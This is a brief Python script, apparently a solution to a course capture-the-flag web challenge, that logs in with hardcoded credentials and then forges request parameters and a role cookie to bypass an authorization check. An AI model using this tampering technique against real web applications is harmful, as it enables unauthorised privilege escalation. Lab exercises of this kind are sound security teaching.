import requests, sys

loginpayload = {"login": "alexrose" , "pwd":"asdfqwerzxcv" }

session = requests.Session()

url = "http://cs495.oregonctf.org/login"

response = session.post(url, data=loginpayload)

targetUrl = "http://cs495.oregonctf.org/challenges/714d8601c303bbef8b5cabab60b1060ac41f0d96f53b6ea54705bb1ea4316334"

postData = {"returnUserRole":"false","returnPassword":"false",
            "adminDetected":"true"}
cookieData = {"challengeRole":"nmHqLjQknlHs"}
response2 = session.post(targetUrl, data=postData, cookies=cookieData)
print(response2.text)
